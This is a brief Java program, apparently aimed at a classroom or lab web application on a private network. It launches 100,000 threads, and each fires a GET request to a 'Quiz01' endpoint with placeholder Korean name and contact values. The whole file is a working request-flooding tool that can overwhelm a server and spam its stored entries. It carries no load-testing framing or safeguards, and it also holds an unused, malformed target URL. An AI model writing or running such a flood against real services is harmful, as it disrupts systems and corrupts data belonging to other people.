import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class main {

    private static final String TARGET_URL = "http://10.5.5.8/Exam01?writer=1234?&message=1234";
    private static final int THREAD_COUNT = 100000;

    public static void main(String[] args) {
        for (int i = 0; i < THREAD_COUNT; i++) {
            new Thread(() -> sendRequest()).start();
        }
    }

    private static void sendRequest() {
        try {
            String encodedWriter = URLEncoder.encode("밍뭉", "UTF-8");
            String encodedMessage = URLEncoder.encode("맹몽", "UTF-8");

            String targetUrl = "http://10.5.5.19/Quiz01?name=" + encodedWriter + "&contact=" + encodedMessage;

            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            System.out.println("Response Code: " + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("Request failed: " + e.getMessage());
        }
    }
}
